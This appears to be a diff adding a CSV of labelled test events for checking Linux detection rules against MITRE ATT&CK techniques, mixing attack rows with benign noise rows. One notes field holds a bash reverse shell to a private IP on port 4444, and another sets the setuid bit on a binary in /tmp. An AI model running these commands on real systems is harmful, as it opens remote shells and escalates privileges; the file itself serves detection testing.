@@ -1,0 +1,6 @@
+timestamp_utc,technique_id,test_number,host,label,expected_rules,notes
+2026-08-28T10:00:00+03:00,T1059.004,1,tiberiu-VirtualBox,TP,Interactive Terminal spawned via Bash,bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+2026-08-28T10:05:00+03:00,NOISE,1,tiberiu-VirtualBox,FP,Legitimate Package Manager Execution,apt-get update && apt-get upgrade -y noise script
+2026-08-28T10:10:00+03:00,T1078.003,1,tiberiu-VirtualBox,TP,Successful SSH Login from unusual IP,Accepted password for root from 192.168.1.100 port 54322 ssh2
+2026-08-28T10:15:00+03:00,NOISE,1,tiberiu-VirtualBox,FP,User legitimately changed their own password,passwd tiberiu (PAM noise script update shadow)
+2026-08-28T10:20:00+03:00,T1548.001,1,tiberiu-VirtualBox,TP,Setuid binary created in /tmp,chmod u+s /tmp/malicious_bin
